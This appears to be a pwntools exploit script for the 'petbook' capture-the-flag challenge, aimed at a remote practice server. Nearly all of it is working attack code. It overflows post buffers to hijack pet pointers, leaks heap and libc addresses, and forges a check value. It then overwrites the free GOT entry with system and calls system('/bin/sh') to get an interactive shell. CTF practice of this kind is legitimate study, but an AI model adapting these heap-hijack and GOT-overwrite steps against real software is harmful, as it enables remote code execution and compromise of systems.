from pwn import *
#context.log_level ='debug'
#p = process('./petbook',env = {"LD_PRELOAD":"../libc-2.23.so.x86_64"})
p = remote('hackme.inndy.tw',7710)
elf = ELF('./petbook')

def register(username,password):
	p.sendlineafter(' >>\n','1')
	p.sendlineafter(' >>\n',username)
	p.sendlineafter(' >>\n',password)

def login(username,password):
	p.sendlineafter(' >>\n','2')
	p.sendlineafter(' >>\n',username)
	p.sendlineafter(' >>\n',password)

def logout():
	p.sendlineafter(' >>\n','0')

def new_post(title,length,content):
	p.sendlineafter(' >>\n','1')
	p.sendlineafter(' >>\n',title)
	p.sendlineafter(' >>\n',str(length))
	p.sendlineafter(' >>\n',content)


def edit_post(id,title,length,content):
	p.sendlineafter(' >>\n','3')
	p.sendlineafter(' >>\n',str(id))
	p.sendlineafter(' >>\n',title)
	p.sendlineafter(' >>\n',str(length))
	p.sendlineafter(' >>\n',content)

def abandon_pet():
	p.sendlineafter(' >>\n','7')

def view_wall():
	p.sendlineafter(' >>\n','2')

def pet_rename(name):
	p.sendlineafter(' >>\n','6')
	p.sendlineafter(' >>\n',name)

def pet_adopt(name):
	p.sendlineafter(' >>\n','5')
	p.sendlineafter(' >>\n',name)


#hijack pet_addr --> userdb
register('a','a')
login('a','a')
payload = 'a'*520 + p64(0x603158-0x10)
new_post('aa',0x220,payload)
edit_post(2,'aa',0x230,'aa')
logout()
register('b','b')

#leak heap addr
login('b','b')
p.recvuntil('Pet Type: ')
heap_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))
log.success('heap addr : 0x%x'%heap_addr)


#hijack c's pet_addr --> b's post
fake_pet = heap_addr + 0x710
payload = 'b'*520 + p64(fake_pet - 0x8)
new_post('bb',0x50,p64(elf.got['puts'])) #uid = 4
new_post('bb',0x220,payload) #uid = 5
view_wall()
edit_post(5,'bb',0x230,'bb')
logout()
register('c','c')

#leak libc
login('c','c')
p.recvuntil('Pet Name: ')
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
offset_puts = 0x000000000006f5d0
libc_base = puts_addr - offset_puts
log.success('libc base addr : 0x%x'%libc_base)
offset_system = 0x0000000000045380
system_addr = libc_base + offset_system
magic_addr = 0x603164

#leak magic
logout()
login('b','b')
edit_post(4,'bb',0x50,p64(magic_addr))

logout()
login('c','c')
p.recvuntil('Pet Name: ')
magic = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))
log.success('maigc : 0x%x'%magic)


#hijack d's pet_addr --> b's post
fake_magic = int(hex(magic)[:6] + '0101',16)
fake_free =  p64(fake_magic) + p64(elf.got['free'])
payload = 'c'*520 + p64(fake_pet)
new_post('cc',0x220,payload) # udi = 7
#view_wall()
edit_post(7,'cc',0x230,'cc')
logout()
register('d','d')

#hijack free_got --> system_addr
login('b','b')
edit_post(4,'bb',0x50,fake_free)
logout()
login('d','d')
pet_rename(p64(system_addr))
#gdb.attach(p,'b *' + str(0x401733))
#gdb.attach(p,'b *' + str(0x40177E))

#system('/bin/sh\x00')
logout()
register('e','e')
login('e','e')
pet_adopt('/bin/sh\x00')
abandon_pet()


p.interactive()
